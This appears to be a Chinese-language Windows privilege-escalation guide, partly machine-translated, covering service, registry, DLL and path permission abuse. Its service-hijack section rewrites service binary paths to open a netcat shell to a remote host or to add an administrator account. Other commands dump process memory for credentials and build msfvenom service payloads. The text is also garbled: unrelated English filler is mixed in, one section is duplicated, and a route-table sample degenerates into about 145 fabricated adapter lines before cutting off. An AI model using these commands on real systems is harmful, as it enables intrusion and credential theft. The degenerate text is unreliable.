A strong password policy is essential for maintaining the security of a Windows system. It helps to prevent unauthorized access and protects sensitive information. Here are some key points to consider when implementing a password policy:

- **Password Complexity**: Require users to create passwords that meet certain complexity requirements, such as a minimum length, a combination of uppercase and lowercase letters, numbers, and special characters.

- **Password Expiration**: Set a policy that requires users to change their passwords periodically. This helps to ensure that passwords are regularly updated and reduces the risk of compromised accounts.

- **Password History**: Enforce a policy that prevents users from reusing their previous passwords. This prevents users from cycling through a small set of passwords and increases the overall security of the system.

- **Account Lockout**: Implement an account lockout policy that temporarily locks user accounts after a certain number of failed login attempts. This helps to prevent brute-force attacks and unauthorized access attempts.

- **Password Length**: Set a minimum password length that is long enough to provide sufficient security. Longer passwords are generally more secure than shorter ones.

- **Password Storage**: Ensure that passwords are stored securely using strong encryption algorithms. Avoid storing passwords in plaintext or using weak encryption methods.

By implementing a strong password policy, you can significantly enhance the security of your Windows system and protect against unauthorized access.
```
net accounts
```
### 获取剪贴板的内容

To retrieve the content of the clipboard in Windows, you can use the following methods:

#### Method 1: Command Prompt

1. Open the Command Prompt as an administrator.
2. Type the following command and press Enter:
   ```
   powershell -command "Get-Clipboard"
   ```

#### Method 2: PowerShell

1. Open PowerShell as an administrator.
2. Use the following command to retrieve the clipboard content:
   ```powershell
   Get-Clipboard
   ```

After executing either of these methods, the content of the clipboard will be displayed in the console output.
```bash
powershell -command "Get-Clipboard"
```
## 运行中的进程

### 文件和文件夹权限

首先，列出进程，**检查进程的命令行中是否包含密码**。\
检查是否可以**覆盖运行中的某些二进制文件**，或者是否具有二进制文件夹的写权限，以利用可能的[**DLL劫持攻击**](dll-hijacking.md)：
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
始终检查可能正在运行的[**electron/cef/chromium调试器**，您可以滥用它来提升权限](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md)。

**检查进程二进制文件的权限**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**检查进程二进制文件的文件夹权限（DLL劫持）**

在进行本地权限提升时，检查进程二进制文件的文件夹权限是一项重要的任务。这可以帮助我们确定是否存在DLL劫持漏洞。DLL劫持是一种攻击技术，利用了Windows操作系统在加载动态链接库（DLL）时的搜索顺序。攻击者可以通过将恶意DLL文件放置在可被系统搜索到的文件夹中，来劫持合法程序的执行流程。

以下是一些常见的DLL劫持漏洞利用的文件夹路径：

- C:\Windows\System32
- C:\Windows\SysWOW64
- C:\Program Files
- C:\Program Files (x86)

通过检查进程二进制文件的文件夹权限，我们可以确定是否存在可被利用的DLL劫持漏洞。如果我们发现某个文件夹的权限允许非特权用户写入或修改其中的文件，那么攻击者就有可能利用该漏洞进行权限提升。

要检查进程二进制文件的文件夹权限，可以使用以下命令：

```plaintext
icacls <binary_folder_path>
```

该命令将显示指定文件夹的权限信息，包括用户和组的访问权限。我们可以根据这些信息来评估是否存在潜在的DLL劫持漏洞。

在进行权限提升时，务必小心操作，遵循合法和道德的准则。
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### 内存密码挖掘

您可以使用Sysinternals的**procdump**创建运行中进程的内存转储。像FTP这样的服务在内存中以明文形式存储**凭据**，尝试转储内存并读取凭据。
```
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### 不安全的图形用户界面应用程序

**以SYSTEM身份运行的应用程序可能允许用户生成CMD命令提示符或浏览目录。**

例如： "Windows 帮助和支持"（Windows + F1），搜索 "命令提示符"，点击 "点击打开命令提示符"

## 服务

获取服务列表：
```
net start
wmic service list brief
sc query
Get-Service
```
### 权限

您可以使用 **sc** 命令获取服务的信息
```
sc qc <service_name>
```
建议使用来自 Sysinternals 的二进制文件 **accesschk** 来检查每个服务所需的特权级别。
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
建议检查是否“已验证的用户”可以修改任何服务：
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[你可以在这里下载适用于XP的accesschk.exe](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### 启用服务

如果你遇到了这个错误（例如SSDPSRV）：

_系统错误 1058 发生。_\
_无法启动服务，因为它已被禁用或没有与之关联的启用设备。_

你可以通过以下方式启用它：
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**请注意，服务upnphost的运行依赖于SSDPSRV（适用于XP SP1）**

**另一种解决方法**是运行以下命令：
```
sc.exe config usosvc start= auto
```
### **修改服务二进制路径**

如果组"Authenticated users"在一个服务中具有**SERVICE\_ALL\_ACCESS**权限，那么它可以修改服务执行的二进制文件路径。要修改并执行**nc**，可以执行以下操作：
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### 重启服务

To restart a service in Windows, you can use the following methods:

#### Method 1: Using the Services Management Console

1. Press `Win + R` to open the Run dialog box.
2. Type `services.msc` and press Enter to open the Services Management Console.
3. In the Services Management Console, locate the service you want to restart.
4. Right-click on the service and select Restart from the context menu.

#### Method 2: Using the Command Prompt

1. Open the Command Prompt as an administrator.
2. Type `net stop [service name]` and press Enter to stop the service.
3. Type `net start [service name]` and press Enter to start the service.

Note: Replace `[service name]` with the actual name of the service you want to restart.

#### Method 3: Using PowerShell

1. Open PowerShell as an administrator.
2. Type `Restart-Service -Name [service name]` and press Enter to restart the service.

Note: Replace `[service name]` with the actual name of the service you want to restart.

By using any of these methods, you can easily restart a service in Windows.
```
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
其他权限可以用于提升特权：\
**SERVICE\_CHANGE\_CONFIG** 可以重新配置服务二进制文件\
**WRITE\_DAC:** 可以重新配置权限，导致 SERVICE\_CHANGE\_CONFIG\
**WRITE\_OWNER:** 可以成为所有者，重新配置权限\
**GENERIC\_WRITE:** 继承 SERVICE\_CHANGE\_CONFIG\
**GENERIC\_ALL:** 继承 SERVICE\_CHANGE\_CONFIG

**要检测和利用**此漏洞，您可以使用 _exploit/windows/local/service\_permissions_

### 服务二进制文件弱权限

**检查是否可以修改由服务执行的二进制文件**，或者是否具有对二进制文件所在文件夹的**写权限**（[**DLL劫持**](dll-hijacking.md)）。\
您可以使用 **wmic**（不在 system32 中）获取由服务执行的每个二进制文件，并使用 **icacls** 检查您的权限：
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
您还可以使用 **sc** 和 **icacls** 命令：
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### 服务注册表修改权限

您应该检查是否可以修改任何服务注册表。\
您可以通过以下方式检查您对服务注册表的权限：
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
检查**Authenticated Users**或**NT AUTHORITY\INTERACTIVE**是否具有FullControl权限。如果是这样，您可以更改将由服务执行的二进制文件。

要更改执行的二进制文件的路径：
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Services registry AppendData/AddSubdirectory permissions

如果您对注册表具有此权限，这意味着**您可以从此注册表创建子注册表**。在Windows服务的情况下，这已经足够执行任意代码了：

{% content-ref url="appenddata-addsubdirectory-permission-over-service-registry.md" %}
[appenddata-addsubdirectory-permission-over-service-registry.md](appenddata-addsubdirectory-permission-over-service-registry.md)
{% endcontent-ref %}

### 未加引号的服务路径

如果可执行文件的路径没有加引号，Windows将尝试执行每个空格之前的部分。

例如，对于路径_C:\Program Files\Some Folder\Service.exe_，Windows将尝试执行：
```
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
列出所有未加引号的服务路径（减去内置的Windows服务）：

```plaintext
1. Open a command prompt with administrative privileges.
2. Run the following command to list all services:
   ```
   sc query type= service state= all | findstr "SERVICE_NAME"
   ```
3. Identify the services that have spaces in their paths.
4. For each service, run the following command to check if the path is unquoted:
   ```
   sc qc <service_name> | findstr "BINARY_PATH_NAME"
   ```
   Replace `<service_name>` with the name of the service.
5. If the path is unquoted, it may be vulnerable to privilege escalation.
```

要列出所有未加引号的服务路径（减去内置的Windows服务）：

```plaintext
1. 以管理员权限打开命令提示符。
2. 运行以下命令以列出所有服务：
   ```
   sc query type= service state= all | findstr "SERVICE_NAME"
   ```
3. 找出路径中包含空格的服务。
4. 对于每个服务，运行以下命令以检查路径是否未加引号：
   ```
   sc qc <service_name> | findstr "BINARY_PATH_NAME"
   ```
   将 `<service_name>` 替换为服务的名称。
5. 如果路径未加引号，则可能存在提权漏洞。
```
```bash
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" | findstr /i /v "C:\Windows\\" |findstr /i /v """
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v """ #Not only auto services

#Other way
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
您可以使用Metasploit检测和利用此漏洞：_exploit/windows/local/trusted\_service\_path_\
您可以使用Metasploit手动创建服务二进制文件：
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### 恢复操作

当执行服务失败时，可以告诉Windows应该做什么。如果该设置指向一个可被覆盖的二进制文件，你可能能够提升权限。

## 应用程序

### 已安装的应用程序

检查二进制文件的权限（也许你可以覆盖其中一个并提升权限），以及文件夹的权限（[DLL劫持](dll-hijacking.md)）。
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### 写入权限

检查是否可以修改某些配置文件以读取某些特殊文件，或者是否可以修改某个将由管理员帐户（schedtasks）执行的二进制文件。

查找系统中弱文件夹/文件权限的一种方法是执行以下操作：
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### 开机自启动

**检查是否可以覆盖将由其他用户执行的某些注册表或二进制文件。**\
**阅读**以下页面以了解更多有关**提升权限的自启动位置**的信息：

{% content-ref url="privilege-escalation-with-autorun-binaries.md" %}
[privilege-escalation-with-autorun-binaries.md](privilege-escalation-with-autorun-binaries.md)
{% endcontent-ref %}

### 驱动程序

寻找可能的**第三方奇怪/易受攻击**的驱动程序
```
driverquery
driverquery.exe /fo table
driverquery /SI
```
## PATH DLL劫持

如果您在PATH中的某个文件夹中具有**写入权限**，则可能能够劫持进程加载的DLL并**提升权限**。

检查PATH中所有文件夹的权限：
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
有关如何滥用此检查的更多信息，请参阅：

{% content-ref url="dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md" %}
[writable-sys-path-+dll-hijacking-privesc.md](dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md)
{% endcontent-ref %}

## 网络

### 共享文件夹
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts文件

检查hosts文件中是否硬编码了其他已知计算机。
```
type C:\Windows\System32\drivers\etc\hosts
```
### 网络接口和DNS

Network interfaces are the physical or virtual connections that a computer uses to communicate with other devices on a network. These interfaces can be Ethernet, Wi-Fi, or any other type of network connection.

网络接口是计算机用于与网络上的其他设备进行通信的物理或虚拟连接。这些接口可以是以太网、Wi-Fi或任何其他类型的网络连接。

DNS (Domain Name System) is a system that translates domain names into IP addresses. It acts as a directory for the internet, allowing users to access websites by typing in a domain name instead of an IP address.

DNS（域名系统）是一种将域名转换为IP地址的系统。它充当互联网的目录，允许用户通过输入域名而不是IP地址来访问网站。

Understanding network interfaces and DNS is important for various hacking techniques, such as network reconnaissance, DNS spoofing, and man-in-the-middle attacks. By manipulating network interfaces and DNS settings, an attacker can redirect traffic, intercept communications, or gain unauthorized access to a target system.

了解网络接口和DNS对于各种黑客技术非常重要，例如网络侦察、DNS欺骗和中间人攻击。通过操纵网络接口和DNS设置，攻击者可以重定向流量、拦截通信或未经授权地访问目标系统。
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### 开放端口

从外部检查**受限制的服务**
```bash
netstat -ano #Opened ports?
```
### 路由表

The routing table is a data structure used by the operating system to determine the next hop for network traffic. It contains a list of network destinations and the corresponding next hop addresses. When a packet is received, the operating system consults the routing table to determine where to send the packet.

路由表是操作系统使用的数据结构，用于确定网络流量的下一跳。它包含了网络目的地和相应的下一跳地址的列表。当接收到一个数据包时，操作系统会查询路由表以确定将数据包发送到哪里。

The routing table is an important component of network communication as it allows for efficient and accurate routing of packets. It helps ensure that packets are delivered to their intended destinations in a timely manner.

路由表是网络通信的重要组成部分，它可以实现数据包的高效和准确路由。它有助于确保数据包及时地传递到其预期的目的地。

In the context of local privilege escalation, the routing table can be useful for an attacker to identify potential network paths that can be exploited to gain higher privileges on a system. By analyzing the routing table, an attacker can identify network routes that may allow them to bypass security measures or gain access to restricted areas of the network.

在本地权限提升的背景下，路由表对于攻击者来说是有用的，可以帮助攻击者识别潜在的网络路径，从而利用这些路径来获取系统上更高的权限。通过分析路由表，攻击者可以识别可能允许他们绕过安全措施或访问网络受限区域的网络路由。

To view the routing table on a Windows system, you can use the `route print` command in the command prompt. This will display the network destinations, netmasks, gateway addresses, and interface information.

要在Windows系统上查看路由表，可以使用命令提示符中的`route print`命令。这将显示网络目的地、子网掩码、网关地址和接口信息。

```plaintext
C:\> route print
===========================================================================
Interface List
  5...00 00 00 00 00 00 ......Microsoft Hyper-V Network Adapter
  4...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter
  3...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #2
  2...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #3
  1...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #4
  6...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #5
  7...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #6
  8...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #7
  9...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #8
 10...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #9
 11...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #10
 12...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #11
 13...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #12
 14...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #13
 15...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #14
 16...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #15
 17...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #16
 18...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #17
 19...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #18
 20...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #19
 21...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #20
 22...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #21
 23...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #22
 24...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #23
 25...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #24
 26...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #25
 27...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #26
 28...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #27
 29...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #28
 30...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #29
 31...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #30
 32...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #31
 33...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #32
 34...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #33
 35...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #34
 36...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #35
 37...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #36
 38...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #37
 39...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #38
 40...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #39
 41...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #40
 42...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #41
 43...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #42
 44...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #43
 45...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #44
 46...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #45
 47...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #46
 48...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #47
 49...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #48
 50...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #49
 51...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #50
 52...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #51
 53...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #52
 54...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #53
 55...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #54
 56...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #55
 57...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #56
 58...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #57
 59...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #58
 60...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #59
 61...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #60
 62...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #61
 63...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #62
 64...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #63
 65...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #64
 66...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #65
 67...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #66
 68...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #67
 69...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #68
 70...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #69
 71...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #70
 72...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #71
 73...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #72
 74...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #73
 75...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #74
 76...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #75
 77...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #76
 78...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #77
 79...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #78
 80...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #79
 81...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #80
 82...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #81
 83...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #82
 84...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #83
 85...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #84
 86...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #85
 87...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #86
 88...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #87
 89...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #88
 90...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #89
 91...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #90
 92...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #91
 93...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #92
 94...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #93
 95...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #94
 96...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #95
 97...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #96
 98...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #97
 99...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #98
100...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #99
101...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #100
102...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #101
103...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #102
104...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #103
105...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #104
106...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #105
107...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #106
108...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #107
109...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #108
110...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #109
111...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #110
112...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #111
113...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #112
114...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #113
115...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #114
116...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #115
117...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #116
118...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #117
119...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #118
120...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #119
121...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #120
122...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #121
123...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #122
124...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #123
125...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #124
126...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #125
127...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #126
128...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #127
129...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #128
130...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #129
131...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #130
132...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #131
133...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #132
134...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #133
135...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #134
136...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #135
137...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #136
138...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #137
139...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #138
140...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #139
141...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #140
142...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #141
143...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #142
144...00 00 00 00 00 00 ......Microsoft Wi-Fi Direct Virtual Adapter #143
145...00 00 00
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
